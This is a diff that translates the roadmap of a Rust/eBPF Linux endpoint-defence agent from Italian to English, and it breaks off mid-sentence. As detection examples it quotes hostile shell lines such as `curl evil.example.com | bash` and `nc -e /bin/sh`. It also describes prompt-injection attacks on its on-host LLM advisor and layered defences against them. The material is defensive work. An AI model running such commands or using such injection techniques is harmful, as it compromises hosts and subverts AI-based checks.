@@ -1,1058 +1,1071 @@
-# NorthNarrow — Roadmap di esecuzione
+# NorthNarrow — Execution roadmap
 
-> Linux first. 100% Rust. Una tappa alla volta, in ordine fisso.
-> Non si salta. Non si torna indietro. Demo visibile ad ogni tappa.
+> **Current state: [`docs/roadmap/CAPABILITY_PROGRAM.md`](docs/roadmap/CAPABILITY_PROGRAM.md).**
+> This roadmap keeps its plans and dates as they were written. Some of
+> them, and some "in progress" states, are older than the current state:
+> since 20 October 2026 (Wave 4) the work is tracked capability by
+> capability in
+> `docs/roadmap/CAPABILITY_PROGRAM.md`, and what each release contains is in
+> `CHANGELOG.md` (the first alpha is `0.1.0-alpha`). Where the two disagree
+> with this file, they are the current source.
+>
+> A *Tappa* (Italian for "stage"; plural *Tappe*) is one step of this
+> roadmap. The word stays as it is because the code, the tests and other
+> documents use it.
 
-Per la mappa completa di lungo termine (hypervisor Ring -1, anti-DMA,
-CET, PQC, honeypots, micro-segmentazione), vedi VISION_TECHNICAL.md.
-Quella è la stella polare. Questa è la marcia operativa.
+> Linux first. 100% Rust. One Tappa at a time, in a fixed order.
+> None is skipped. There is no going back. A visible demo at every Tappa.
+
+For the full long-term map (Ring -1 hypervisor, anti-DMA, CET, PQC,
+honeypots, micro-segmentation), see VISION_TECHNICAL.md.
+That is the north star. This is the working plan.
 
 
-## Stato di avanzamento (aggiornato il 16 ottobre 2026)
+## Progress (updated on 16 October 2026)
 
-| Tappa | Stato | Riferimento |
+| Tappa | State | Reference |
 |---|---|---|
-| 0 – 5 | chiuse | workspace, sensori eBPF, decision engine, KillProcess, response engine |
-| 6 (6.1 → 6.9.7) | chiuse; ADE rimosso | posture adattiva (resta); ADE su Candle, anti prompt-injection, RAG KB, XAI e performance rimossi nella Wave 4 (lab PR 214) |
-| 7 | chiusa | anti-tamper (task_kill, ptrace, inode_protect, watchdog respawn v2) |
-| 8 | chiusa | sblocco COMBAT con firma Ed25519, audit log firmato |
-| 9 (FIM) + 9.0.a/b/c | chiuse | File Integrity Monitoring, detections su chainlog firmato, triage |
-| 9.5 + 9.5.1 | chiuse | canary token e honeypot anti-tamper |
-| 10 (rete) + 10.5 + 10.6 | chiuse | osservabilità di rete, 69 regole alla chiusura (76 oggi), profondità di detection |
-| 10.7 | in corso | validazione avversariale via Kali (design chiuso, range automatizzato) |
-| **10.8** | **in corso** | affidabilità: hardening 8–10 ott, upgrade/uninstall, release firmata, multi-kernel (4 kernel), soak da 24 h, fuzzing, io_uring (prima parte), autodifesa BPF, avversariale anti-tamper, overhead su 6.8, pacchetti `.deb`/`.rpm`; restano il soak da 72 h, l'overhead sugli altri guest, la chiave di firma dell'`.rpm` (azione del maintainer) e la verifica in lab dei kernel dal 6.9 (`inode_setattr`, gestito dal lab PR 164; Debian 13 / 6.12 verificato il 16/10: chmod, chown e touch di un file protetto rifiutati; 81 test privilegiati su 82, il fallito — l'attribuzione DNS — fallisce anche su main per il resolver del guest) |
-| 10.9 | in corso | copertura delle evasioni: contesto cgroup/container, injection a runtime, DNS cifrato/tunnel (decisa il 10 ottobre dopo revisione esterna); punto di aggancio dei sensori: progetto accettato, passo 0 superato su 6.8, 6.1 e 5.15, passi 1 (aperture file su LSM), 2 (exec su LSM) e 3 (DNS letto dal buffer del socket, anche IPv6) fatti il 12 ottobre |
-| Audit esterno di `16f7563` | Wave 0–2 chiuse, Wave 3 non iniziata | 444 rilievi: Wave 0 e 1 (6 Critical, 70 High) e Wave 2 (159 Medium) chiuse, Wave 3 (188 Low, 21 Info) non iniziata; seguiti trovati in lab da chiudere. Registro: `docs/audit/EXTERNAL_AUDIT_16f7563.md`; note per l'operatore: `docs/operator/UPGRADE_NOTES_AUDIT_16f7563.md` |
-| UI locale, Scout proattivo | non iniziate | slittate dopo la 10.9, numerazione da confermare dal founder |
-| 11 – 17 | non iniziate | Windows, backend EU, console, hardening avanzato, beta, lancio |
+| 0 – 5 | closed | workspace, eBPF sensors, decision engine, KillProcess, response engine |
+| 6 (6.1 → 6.9.7) | closed; ADE removed | adaptive posture (stays); ADE on Candle, anti prompt-injection, RAG KB, XAI and performance removed in Wave 4 (lab PR 214) |
+| 7 | closed | anti-tamper (task_kill, ptrace, inode_protect, watchdog respawn v2) |
+| 8 | closed | COMBAT unlock with an Ed25519 signature, signed audit log |
+| 9 (FIM) + 9.0.a/b/c | closed | File Integrity Monitoring, detections on a signed chainlog, triage |
+| 9.5 + 9.5.1 | closed | canary tokens and anti-tamper honeypots |
+| 10 (network) + 10.5 + 10.6 | closed | network observability, 69 rules at closing (76 today), detection depth |
+| 10.7 | in progress | adversarial validation through Kali (design closed, automated range) |
+| **10.8** | **in progress** | reliability: hardening 8–10 Oct, upgrade/uninstall, signed release, multi-kernel (4 kernels), 24 h soak, fuzzing, io_uring (first part), BPF self-defence, anti-tamper adversarial, overhead on 6.8, `.deb`/`.rpm` packages; still open: the 72 h soak, the overhead on the other guests, the `.rpm` signing key (a maintainer action) and the lab check of kernels from 6.9 (`inode_setattr`, handled by lab PR 164; Debian 13 / 6.12 checked on 16/10: chmod, chown and touch of a protected file refused; 81 privileged tests out of 82, the failed one — DNS attribution — also fails on main because of the guest's resolver) |
+| 10.9 | in progress | evasion coverage: cgroup/container context, runtime injection, encrypted DNS/tunnels (decided on 10 October after an external review); sensor attach point: design accepted, step 0 passed on 6.8, 6.1 and 5.15, steps 1 (file opens on LSM), 2 (exec on LSM) and 3 (DNS read from the socket buffer, IPv6 too) done on 12 October |
+| External audit of `16f7563` | Waves 0–2 closed, Wave 3 not started | 444 findings: Waves 0 and 1 (6 Critical, 70 High) and Wave 2 (159 Medium) closed, Wave 3 (188 Low, 21 Info) not started; follow-ups found in the lab still to close. Register: `docs/audit/EXTERNAL_AUDIT_16f7563.md`; operator notes: `docs/operator/UPGRADE_NOTES_AUDIT_16f7563.md` |
+| Local UI, proactive Scout | not started | moved after 10.9, numbering to be confirmed by the founder |
+| 11 – 17 | not started | Windows, EU backend, console, advanced hardening, beta, launch |
 
-Release taggata: `v0.0.1-tappa9.0` (9 ottobre 2026) — tutto fino alla Tappa 9.0 più il giro
-di hardening. Registri difetti: `docs/audit/NN_BUG_AUDIT_2026-06-09.md`,
-`docs/audit/NN_REVIEW_2026-10-08.md` (High e Medium tutti chiusi al 9 ottobre),
-`docs/audit/EXTERNAL_AUDIT_16f7563.md` (audit esterno del 12 ottobre: Critical, High e
-Medium chiusi al 16 ottobre, con i seguiti trovati in lab).
+Tagged release: `v0.0.1-tappa9.0` (9 October 2026) — everything up to Tappa 9.0 plus the
+hardening round. Defect registers: `docs/audit/NN_BUG_AUDIT_2026-06-09.md`,
+`docs/audit/NN_REVIEW_2026-10-08.md` (High and Medium all closed by 9 October),
+`docs/audit/EXTERNAL_AUDIT_16f7563.md` (external audit of 12 October: Critical, High and
+Medium closed by 16 October, with the follow-ups found in the lab).
 
-Decisione di prodotto del 15 ottobre 2026 (lab PR 134): l'ADE è un consulente. Un
-verdetto del modello che nomina un'azione (Kill, KillTree, Quarantine, BlockNetwork,
-Isolate) è registrato come raccomandazione, con il ragionamento del modello, e non è
-eseguito; le risposte restano alle regole deterministiche e alla scala COMBAT.
-`NN_ADE_ENFORCE=1` riabilita l'esecuzione ed è registrata come variabile
-d'indebolimento nell'audit log firmato.
+Product decision of 15 October 2026 (lab PR 134): the ADE is an advisor. A
+model verdict that names an action (Kill, KillTree, Quarantine, BlockNetwork,
+Isolate) is recorded as a recommendation, with the model's reasoning, and is not
+carried out; responses stay with the deterministic rules and the COMBAT ladder.
+`NN_ADE_ENFORCE=1` turns execution back on and is recorded as a weakening
+variable in the signed audit log.
 
-Decisione di prodotto del 20 ottobre 2026 (Wave 4, lab PR 214): il consulente
-LLM on-host è rimosso — l'ADE, la RAG KB, l'XAI, il fork di candle e ogni
-dipendenza di modello e tokenizer. Un modello di più GB dentro il processo root
-dell'agente, alimentato con stringhe scritte dall'attaccante, era la superficie
-d'attacco più grande dell'agente; la sua accuratezza non è mai stata misurata;
-costava GB di RAM sui server; gli EDR maturi tengono deterministica la
-detection on-host (un assistente AI, se ci sarà, sta fuori dal percorso di
-enforcement, per esempio un futuro assistente per l'analista sul backend). La
-detection resta deterministica: regole, correlazione, posture, COMBAT. I flag e
-le variabili dell'ADE sono ignorati con un WARN
+Product decision of 20 October 2026 (Wave 4, lab PR 214): the on-host LLM
+advisor is removed — the ADE, the RAG KB, the XAI, the candle fork and every
+model and tokenizer dependency. A model of several GB inside the agent's root
+process, fed with strings written by the attacker, was the agent's largest
+attack surface; its accuracy was never measured; it cost GBs of RAM on
+servers; mature EDRs keep on-host detection deterministic (an AI assistant,
+if there is one, stays outside the enforcement path, for example a future
+assistant for the analyst on the backend). Detection stays deterministic:
+rules, correlation, posture, COMBAT. The ADE's flags and variables are
+ignored with a WARN
 (`docs/operator/UPGRADE_NOTES_WAVE4.md`).
 
 ---
 
-## Tappa 0 — Fondamenta del repo
+## Tappa 0 — Repository foundations
 
-Obiettivo: struttura del workspace Rust pronta per costruire sopra.
+Goal: a Rust workspace structure ready to build on.
 
-- Cargo workspace con membri: agent/, common/, cli/
-- Dipendenze base: tokio, tracing, serde, anyhow, thiserror
-- CI minimale (cargo build, cargo test, cargo clippy, cargo fmt)
-- README pulito, LICENSE (Apache-2.0), CONTRIBUTING
+- Cargo workspace with members: agent/, common/, cli/
+- Base dependencies: tokio, tracing, serde, anyhow, thiserror
+- Minimal CI (cargo build, cargo test, cargo clippy, cargo fmt)
+- Clean README, LICENSE (Apache-2.0), CONTRIBUTING
 
-Demo: `cargo build` verde su Linux x86_64.
+Demo: `cargo build` green on Linux x86_64.
 
 ---
 
-## Tappa 1 — Primo sensore eBPF Rust (Aya)
+## Tappa 1 — First Rust eBPF sensor (Aya)
 
-Obiettivo: vedere ogni processo che parte sul sistema.
+Goal: see every process that starts on the system.
 
-- Programma eBPF Rust con framework Aya, no_std
-- Tracepoint su sched_process_exec
-- Userland Rust legge eventi via ringbuffer
-- Eventi serializzati in formato canonico Event::ProcessSpawn
+- Rust eBPF program with the Aya framework, no_std
+- Tracepoint on sched_process_exec
+- Rust userland reads events through a ring buffer
+- Events serialised in the canonical Event::ProcessSpawn format
 
-Demo: lanci l'agent, apri un terminale, esegui `ls`. L'agent stampa
+Demo: you start the agent, open a terminal, run `ls`. The agent prints
 "ProcessSpawn pid=X comm=ls cmdline=..."
 
 ---
 
-## Tappa 2 — Decision engine base (regole hardcoded)
+## Tappa 2 — Basic decision engine (hardcoded rules)
 
-Obiettivo: primo cervello. Niente LLM ancora. Solo regole esplicite.
+Goal: a first brain. No LLM yet. Only explicit rules.
 
-- Modulo decision::rules con ~10 regole iniziali (hardcoded)
-- Esempi: `curl | bash`, `chmod +x /tmp/*`, `nc -e /bin/sh`
+- decision::rules module with ~10 initial rules (hardcoded)
+- Examples: `curl | bash`, `chmod +x /tmp/*`, `nc -e /bin/sh`
 - Output: Verdict { action: ResponseAction, severity: Severity }
 - ResponseAction = enum (Log, KillProcess, BlockOutbound, ...)
-  ma per ora SOLO Log viene eseguito
+  but for now ONLY Log is carried out
 
-Demo: esegui `curl evil.example.com | bash`. Agent logga
-"VERDICT: KillProcess (severity: High) — would kill pid X" ma il
-processo continua. Vedi che il cervello ragiona.
-
----
-
-## Tappa 3 — Mani che colpiscono: KillProcess reale
-
-Obiettivo: PRIMA VOLTA che NorthNarrow uccide qualcosa davvero.
-
-- Modulo response::executor::kill
-- kill_process(pid) via nix::sys::signal::kill(SIGKILL)
-- kill_process_tree(pid) walk di /proc per trovare i figli
-- Wiring nel decision engine: se verdict = KillProcess, esegui davvero
-- Test: spawn un processo finto (sleep 1000), simulazione verdict
-  KillProcess, asserisci che è morto in <100ms
-
-Demo: ripeti il test della Tappa 2. Stavolta il bash viene UCCISO.
-NorthNarrow è ora un difensore, non più un osservatore.
+Demo: run `curl evil.example.com | bash`. The agent logs
+"VERDICT: KillProcess (severity: High) — would kill pid X" but the
+process goes on. You see that the brain reasons.
 
 ---
 
-## Tappa 4 — Sensori eBPF completi
+## Tappa 3 — Hands that strike: real KillProcess
 
-Obiettivo: copertura totale degli eventi rilevanti.
+Goal: the FIRST TIME NorthNarrow really kills something.
 
-- LSM hook bprm_check_security (controllo exec)
+- response::executor::kill module
+- kill_process(pid) through nix::sys::signal::kill(SIGKILL)
+- kill_process_tree(pid) walks /proc to find the children
+- Wiring in the decision engine: if verdict = KillProcess, really do it
+- Test: spawn a fake process (sleep 1000), simulate a KillProcess
+  verdict, assert that it is dead in <100ms
+
+Demo: repeat the Tappa 2 test. This time the bash is KILLED.
+NorthNarrow is now a defender, no longer an observer.
+
+---
+
+## Tappa 4 — Complete eBPF sensors
+
+Goal: full coverage of the relevant events.
+
+- LSM hook bprm_check_security (exec control)
 - LSM hook file_open (FIM file integrity monitoring)
-- Kprobe su tcp_v4_connect e tcp_v6_connect (rete uscente)
-- Kprobe su udp_sendmsg per filtrare DNS queries
-- Tutti i sensori in Rust+Aya, no C, no_std
+- Kprobe on tcp_v4_connect and tcp_v6_connect (outgoing network)
+- Kprobe on udp_sendmsg to filter DNS queries
+- All sensors in Rust+Aya, no C, no_std
 
-Demo: flusso eventi multi-categoria visibile in tempo reale.
+Demo: a multi-category event stream visible in real time.
 
 ---
 
-## Tappa 5 — Esecutori response completi
+## Tappa 5 — Complete response executors
 
-Obiettivo: tutte le azioni difensive concrete, non solo Kill.
+Goal: all the concrete defensive actions, not only Kill.
 
-- BlockOutbound(pid) — nftables via crate rustables o syscalls
-- FullNetworkIsolation — drop di tutto tranne mTLS verso C2
-- Quarantine(path) — sposta il file in /var/lib/northnarrow/quarantine/,
-  cifrato con AES-256-GCM (aes-gcm crate Rust puro)
+- BlockOutbound(pid) — nftables through the rustables crate or syscalls
+- FullNetworkIsolation — drop everything except mTLS to the C2
+- Quarantine(path) — moves the file to /var/lib/northnarrow/quarantine/,
+  encrypted with AES-256-GCM (the pure Rust aes-gcm crate)
 - ThrottleProcess(pid) — cgroup v2 CPU/IO limits
 
-Demo: ransomware finto cifra file in /tmp/lab/. NorthNarrow
-killa il processo + isola la macchina + quarantena il binario.
-Tutto in <500ms.
+Demo: a fake ransomware encrypts files in /tmp/lab/. NorthNarrow
+kills the process + isolates the machine + quarantines the binary.
+All in <500ms.
 
 ---
 
-## Tappa 6 — Cervello LLM locale (Candle)
+## Tappa 6 — Local LLM brain (Candle)
 
-> Historical: the on-host LLM advisor was removed in Wave 4, lab PR 214. Della Tappa 6 resta la
-> Sub-tappa 6.5 (posture adattiva), senza la modulazione dei verdetti del modello.
+> Historical: the on-host LLM advisor was removed in Wave 4, lab PR 214. What remains of Tappa 6 is
+> Sub-tappa 6.5 (adaptive posture), without the modulation of the model's verdicts.
 
-Obiettivo: decisioni euristiche su casi ambigui.
+Goal: heuristic decisions on ambiguous cases.
 
-- Crate candle-core + candle-transformers (100% Rust, zero C/C++)
-- Modello quantizzato Q4 (Gemma 2B o Mistral 7B Q4)
-- Inferenza locale, <2GB RAM
-- Pipeline: regole hardcoded (Tappa 2) decidono prima. Casi ambigui
-  passano all'LLM con prompt strutturato
-- Output dell'LLM: {verdict, confidence, reasoning}. Se confidence 
-  soglia → escalation umano (livello B)
+- candle-core + candle-transformers crates (100% Rust, zero C/C++)
+- Q4 quantised model (Gemma 2B or Mistral 7B Q4)
+- Local inference, <2GB RAM
+- Pipeline: the hardcoded rules (Tappa 2) decide first. Ambiguous cases
+  go to the LLM with a structured prompt
+- LLM output: {verdict, confidence, reasoning}. If confidence 
+  threshold → human escalation (level B)
 
-Demo: binario sconosciuto eseguito. Regole non lo classificano.
-LLM lo analizza (filename, syscalls, network behavior) e decide.
-Dal 15 ottobre 2026 (lab PR 134) la decisione del modello è una
-raccomandazione registrata, non un'azione: vedi lo stato di avanzamento.
+Demo: an unknown binary is run. The rules do not classify it.
+The LLM analyses it (filename, syscalls, network behaviour) and decides.
+Since 15 October 2026 (lab PR 134) the model's decision is a
+recorded recommendation, not an action: see the progress section.
 
-### Sub-tappa 6.1 — Backend candle reale (chiusa)
+### Sub-tappa 6.1 — Real candle backend (closed)
 
-- Backend candle Llama 3.1 GGUF Q4_K_M, 100% Rust.
-- Foundation-Sec-8B-Reasoning come modello di default.
-- Smoke test runnable + bench example.
-- Tracing prefill/decode + ADE_DEMO_LIMIT.
+- Candle Llama 3.1 GGUF Q4_K_M backend, 100% Rust.
+- Foundation-Sec-8B-Reasoning as the default model.
+- Runnable smoke test + bench example.
+- Prefill/decode tracing + ADE_DEMO_LIMIT.
 
-### Sub-tappa 6.5 — Adaptive Defensive Posture (chiusa)
+### Sub-tappa 6.5 — Adaptive Defensive Posture (closed)
 
-- State machine 4-tier persistente cross-eventi: OBSERVING → ALERTED
-  → ENGAGED → COMBAT (ordinati per gravità).
-- `agent::posture::PostureMachine` come handle Arc-backed,
-  Send + Sync. `observe(event, recent_events)` notifica eventi e
-  ritorna Some(stato) sulle transizioni; `modulate_verdict(v)`
-  applicava severity-inflation + Allow→Alert in ALERTED+ ai verdetti
-  dell'ADE (rimosso con l'ADE nella Wave 4, lab PR 214); `tick_decay`
-  fa decadere la posture (1h ALERTED→OBSERVING, 24h ENGAGED→
-  ALERTED, COMBAT mai).
-- `common::posture_types` per i tipi serializable (audit log).
-- 12 trigger-types (Reconnaissance, SuspiciousDns, SensitiveFileAccess,
+- A 4-tier state machine, persistent across events: OBSERVING → ALERTED
+  → ENGAGED → COMBAT (ordered by severity).
+- `agent::posture::PostureMachine` as an Arc-backed handle,
+  Send + Sync. `observe(event, recent_events)` reports events and
+  returns Some(state) on transitions; `modulate_verdict(v)`
+  applied severity inflation + Allow→Alert in ALERTED+ to the ADE's
+  verdicts (removed with the ADE in Wave 4, lab PR 214); `tick_decay`
+  makes the posture decay (1h ALERTED→OBSERVING, 24h ENGAGED→
+  ALERTED, COMBAT never).
+- `common::posture_types` for the serialisable types (audit log).
+- 12 trigger types (Reconnaissance, SuspiciousDns, SensitiveFileAccess,
   Lolbas, ExploitAttempt, AdjacentCompromise, HeavyReconnaissance,
   CriticalFileModification, ConfirmedIntrusion, PersistenceMechanism,
   LateralMovement, ExfiltrationPattern).
-- Decay timer su `std::time::Instant` (immune a NTP).
-- Exit da COMBAT: stub `admin_release_combat(bool)`. Tappa 8 lo
-  sostituisce con verifier Ed25519.
-- ADE schema invariato (v1.0.0). Modulazione preserva la regola
+- Decay timer on `std::time::Instant` (immune to NTP).
+- Exit from COMBAT: stub `admin_release_combat(bool)`. Tappa 8
+  replaces it with an Ed25519 verifier.
+- ADE schema unchanged (v1.0.0). The modulation keeps the rule
   `Allow ⇔ severity == None`.
 
-Differenziatore strutturale: tutti gli EDR commerciali 2026
-valutano gli eventi in isolamento. NorthNarrow no — la posture
-ricorda quel che ha visto e diventa più aggressiva man mano che le
-prove si accumulano.
+Structural differentiator: all commercial EDRs in 2026
+evaluate events in isolation. NorthNarrow does not — the posture
+remembers what it has seen and becomes more aggressive as the
+evidence builds up.
 
 Demo: `cargo run -p northnarrow-agent --release --example
-posture_demo --features posture-demo` mostra le transizioni OBSERVING→ALERTED→ENGAGED→
-COMBAT e il COMBAT bloccato (la modulazione Allow→Alert è uscita con l'ADE
-nella Wave 4).
+posture_demo --features posture-demo` shows the OBSERVING→ALERTED→ENGAGED→
+COMBAT transitions and COMBAT held (the Allow→Alert modulation left with the
+ADE in Wave 4).
 
-### Sub-tappa 6.6 — ADE Hardening contro Prompt Injection (chiusa)
+### Sub-tappa 6.6 — ADE Hardening against Prompt Injection (closed)
 
-Obiettivo: rendere ADE robusto a filename/argv/env manipolati
-dall'attaccante che fingono di essere istruzioni per il modello.
-Difese in profondità (4 strati):
+Goal: make the ADE robust to filenames/argv/env crafted by the
+attacker to pose as instructions to the model.
+Defence in depth (4 layers):
 
 1. **Sanitization preprocessing** (`agent::ade::sanitize`):
-   filtra instruction keywords, special chat-template tokens
-   (Llama 3.1, ChatML), homoglyph Cirillico/Greco, zero-width chars,
-   bidi-control, non-printable, argv overlong. Calcola un
+   filters instruction keywords, special chat-template tokens
+   (Llama 3.1, ChatML), Cyrillic/Greek homoglyphs, zero-width chars,
+   bidi-control, non-printable, overlong argv. It computes an
    `injection_score` 0..1.
 2. **Structured prompting** (`agent::ade::structured_prompt`):
-   wrappa i campi untrusted in delimitatori XML-style
-   (`=== UNTRUSTED EVENT DATA ===`) e li presenta sia in base64 sia
-   decodificati, con priming "treat as opaque data" prima e dopo.
-3. **Sanity check post-verdict** (`agent::ade::sanity_check`):
-   intercetta verdetti incoerenti (alto injection_score + Allow,
-   tactic TA0040/TA0010 + Allow, severe IoC + Low) e li sostituisce
-   con un Escalate Tier1 sintetico schema-valido. Inconsistencies
-   meno gravi vengono solo flaggate in metadata.
+   wraps the untrusted fields in XML-style delimiters
+   (`=== UNTRUSTED EVENT DATA ===`) and presents them both in base64 and
+   decoded, with "treat as opaque data" priming before and after.
+3. **Post-verdict sanity check** (`agent::ade::sanity_check`):
+   catches inconsistent verdicts (high injection_score + Allow,
+   tactic TA0040/TA0010 + Allow, severe IoC + Low) and replaces them
+   with a synthetic, schema-valid Escalate Tier1. Less serious
+   inconsistencies are only flagged in metadata.
 4. **Dual-model verification stub** (`agent::ade::dual_verify`):
-   per Kill/KillTree/Quarantine/Isolate/BlockOutbound/Throttle
-   richiede il via libera da `DeterministicVerifier` (no Kill su
-   pid<1000, Isolate solo con severity Critical, Kill conf≥0.70,
-   ecc.). Tappa 6.6+ sostituirà con un secondo LLM call.
+   for Kill/KillTree/Quarantine/Isolate/BlockOutbound/Throttle
+   it needs the go-ahead from `DeterministicVerifier` (no Kill on
+   pid<1000, Isolate only with severity Critical, Kill conf≥0.70,
+   etc.). Tappa 6.6+ will replace it with a second LLM call.
 
-Early reject: `injection_score ≥ 0.90` causa Escalate sintetico
-senza spendere un round-trip di inferenza.
+Early reject: `injection_score ≥ 0.90` causes a synthetic Escalate
+without spending an inference round-trip.
 
 Demo: `cargo run -p northnarrow-agent --release --example
-ade_attacks` lancia 40 attacchi sintetici classificati in 7
-categorie (direct injection via filename, indirect via comm/argv,
+ade_attacks` runs 40 synthetic attacks, classified in 7
+categories (direct injection through the filename, indirect through comm/argv,
 encoding evasion, multi-language, schema exploits, context
-flooding, social engineering) e produce un report
-BLOCKED/PARTIAL/FOOLED per categoria. Richiede il modello GGUF
-caricato (~7-20 min su CCX23). Le 4 layers + lo schema parser
-catturano la maggior parte delle famiglie di attacco prima che il
-modello le veda.
+flooding, social engineering), and produces a
+BLOCKED/PARTIAL/FOOLED report per category. It needs the GGUF model
+loaded (~7-20 min on CCX23). The 4 layers + the schema parser
+catch most attack families before the
+model sees them.
 
-ADE schema invariato (v1.0.0). Posture machine (Sub-tappa 6.5)
-non modificata. Rule engine, sensori, executor non modificati.
+ADE schema unchanged (v1.0.0). Posture machine (Sub-tappa 6.5)
+not changed. Rule engine, sensors, executor not changed.
 
-### Sub-tappa 6.6.1 — Layer 1 detectors estesi (chiusa)
+### Sub-tappa 6.6.1 — Extended Layer 1 detectors (closed)
 
-Chiude le 4 famiglie di attacchi che in 6.6 superavano Layer 1
-(sanitization) e arrivavano fino a Layer 3/4:
+Closes the 4 attack families that in 6.6 got past Layer 1
+(sanitization) and reached Layer 3/4:
 
 - **Multilingual keyword dictionary** — IT/ES/FR/DE/PT/RU/ZH/JA/AR.
-  La detection runna su tre viste: input troncato grezzo (per
-  catturare cirillico / Han / arabo prima della homoglyph
-  replacement), il `buf` sanificato (per il latino), e il
-  `lower`+`_-.→spazio` normalizzato. Nuovo flag
+  Detection runs on three views: the raw truncated input (to
+  catch Cyrillic / Han / Arabic before the homoglyph
+  replacement), the sanitised `buf` (for Latin), and the
+  normalised `lower`+`_-.→space`. New flag
   `MultilingualKeyword { lang, keyword }`.
-- **ROT13 normalizer** — su stringhe ASCII di lunghezza ≥ 8 senza
-  caratteri non-Latini, applica `normalize_rot13` e ricontrolla
-  contro il dizionario EN. Nuovo flag
+- **ROT13 normalizer** — on ASCII strings of length ≥ 8 without
+  non-Latin characters, it applies `normalize_rot13` and checks again
+  against the EN dictionary. New flag
   `RotEncoded { original, decoded }`.
-- **Visual substitution detector** — confronta il basename del
-  filename contro una lista di binari di sistema
-  (`SYSTEM_BINARY_LOOKALIKES`: ls, ssh, sudo, …) usando una
-  tabella di lookalike (`l↔1↔I↔|`, `s↔5↔$`, `o↔0↔O`, …). Match
-  quando ogni posizione che differisce è un lookalike registrato.
-  Nuovo flag `VisualSubstitution { suspected_target, actual }`.
-- **Variant separator detector** — riconosce
-  `northnarrow-`/`_`/`.`/`|`/spazio (e simili per `system:`,
-  `[INST]`, ecc.) come tentativi di evadere il match canonico
-  `northnarrow:`. Nuovo flag
+- **Visual substitution detector** — compares the basename of the
+  filename against a list of system binaries
+  (`SYSTEM_BINARY_LOOKALIKES`: ls, ssh, sudo, …) using a
+  lookalike table (`l↔1↔I↔|`, `s↔5↔$`, `o↔0↔O`, …). A match
+  when every position that differs is a registered lookalike.
+  New flag `VisualSubstitution { suspected_target, actual }`.
+- **Variant separator detector** — recognises
+  `northnarrow-`/`_`/`.`/`|`/space (and the like for `system:`,
+  `[INST]`, etc.) as attempts to evade the canonical match
+  `northnarrow:`. New flag
   `VariantSeparator { canonical, variant }`.
 
-Score weights: ognuno dei 4 nuovi flag pesa 0.40-0.45 (in linea
-con `InstructionKeyword`); HomoglyphDetected sale da 0.20 a 0.30
-per riflettere la sua natura multi-script.
+Score weights: each of the 4 new flags weighs 0.40-0.45 (in line
+with `InstructionKeyword`); HomoglyphDetected goes up from 0.20 to 0.30
+to reflect its multi-script nature.
 
-12 unit test nuovi nel modulo `agent::ade::sanitize::tests`.
+12 new unit tests in the `agent::ade::sanitize::tests` module.
 
-Effetto sul demo `ade_attacks`: D1, D2, C4, G3, G4 — i 5 attacchi
-che in 6.6 erano marcati come "slip Layer 1" — ora producono
-`injection_score ≥ 0.40` al primo strato, e in molti casi
-sufficiente a innescare l'early-reject Tier1Review (soglia 0.90)
-quando si combinano con altri segnali.
+Effect on the `ade_attacks` demo: D1, D2, C4, G3, G4 — the 5 attacks
+that in 6.6 were marked as "slip Layer 1" — now produce
+`injection_score ≥ 0.40` at the first layer, in many cases
+enough to trigger the Tier1Review early reject (threshold 0.90)
+when combined with other signals.
 
-ADE schema invariato (v1.0.0). Posture machine, structured prompt,
-sanity check, dual verify (gli altri 3 strati di Sub-tappa 6.6)
-non modificati.
+ADE schema unchanged (v1.0.0). Posture machine, structured prompt,
+sanity check, dual verify (the other 3 layers of Sub-tappa 6.6)
+not changed.
 
-### Sub-tappa 6.7 — RAG knowledge base architetturale (chiusa)
+### Sub-tappa 6.7 — Architectural RAG knowledge base (closed)
 
-Aggiunge un layer di Retrieval-Augmented Generation tra l'evento
-e l'inferenza: prima che ADE chiami il modello, una knowledge base
-locale curata di 30 documenti viene interrogata via cosine
-similarity e gli hit più rilevanti vengono iniettati nel prompt
-come blocco TRUSTED. Risultato: ADE riconosce TTPs, IoCs, e
-threat-tooling che il modello base non conosce
+Adds a Retrieval-Augmented Generation layer between the event
+and the inference: before the ADE calls the model, a local curated
+knowledge base of 30 documents is queried through cosine
+similarity, and the most relevant hits are injected into the prompt
+as a TRUSTED block. Result: the ADE recognises TTPs, IoCs and
+threat tooling that the base model does not know
 (post-knowledge-cutoff).
 
-Componenti:
+Components:
 
-- `common::rag_types` — tipi serializzabili (`KbCategory`,
+- `common::rag_types` — serialisable types (`KbCategory`,
   `KbDocument`, `RagDocument`, `RagResult`, `KB_EMBEDDING_DIM=384`).
-- `agent::rag::embedder` — `RagEmbedder` con embedding deterministico
-  via FNV-1a-hashed character 3- e 4-grams in 384 buckets,
-  L2-normalizzato. Stand-in per un futuro bge-small-en-v1.5 caricato
-  via candle.
-- `agent::rag::store` — `RagStore` in-memory con scan lineare
-  cosine top-k filtrato da soglia di similarità. Scelto al posto
-  di LanceDB perché lancedb 0.10 trascina datafusion + arrow-array
-  e raddoppia il tempo di compilazione, senza benefici a scala
-  30 documenti (lo scan lineare è in microsecondi).
+- `agent::rag::embedder` — `RagEmbedder` with a deterministic embedding
+  through FNV-1a-hashed character 3- and 4-grams in 384 buckets,
+  L2-normalised. A stand-in for a future bge-small-en-v1.5 loaded
+  through candle.
+- `agent::rag::store` — in-memory `RagStore` with a linear
+  cosine top-k scan, filtered by a similarity threshold. Chosen instead
+  of LanceDB because lancedb 0.10 pulls in datafusion + arrow-array
+  and doubles the compile time, with no benefit at the scale of
+  30 documents (the linear scan takes microseconds).
 - `agent::rag::retrieval` — `RagEngine::with_seed(model_path)` +
   `retrieve(RagQuery)`. Default top_k=3, min_similarity=0.15
-  (calibrata sul stand-in n-gram; con bge-small reale andrebbe
-  alzata a ~0.4).
-- `agent::rag::kb_seed` — 30 documenti hardcoded distribuiti
-  esattamente per la spec: 10 MITRE technique, 5 Sigma rule, 5
-  LOLBAS, 5 Linux pattern, 5 threat tool.
+  (tuned on the n-gram stand-in; with a real bge-small it should
+  be raised to ~0.4).
+- `agent::rag::kb_seed` — 30 hardcoded documents, split
+  exactly as the spec says: 10 MITRE techniques, 5 Sigma rules, 5
+  LOLBAS, 5 Linux patterns, 5 threat tools.
 - `agent::ade::rag_integration` — `build_rag_query_from_event`
   (process spawn → "process {comm} from {filename}", DNS →
   "dns query from {comm} to {qname}", TCP → "...port {port}", …)
-  e `format_rag_block` (rende RagResult come blocco TRUSTED nel
-  prompt strutturato, posizionato dopo l'host context e prima dei
-  dati untrusted).
-- `agent::ade::AdeEngine::with_rag(rag)` — wiring opt-in che
-  preserva byte-identicamente il comportamento pre-6.7 quando il
-  RAG è assente (tutti i test esistenti continuano a passare).
+  and `format_rag_block` (renders a RagResult as a TRUSTED block in the
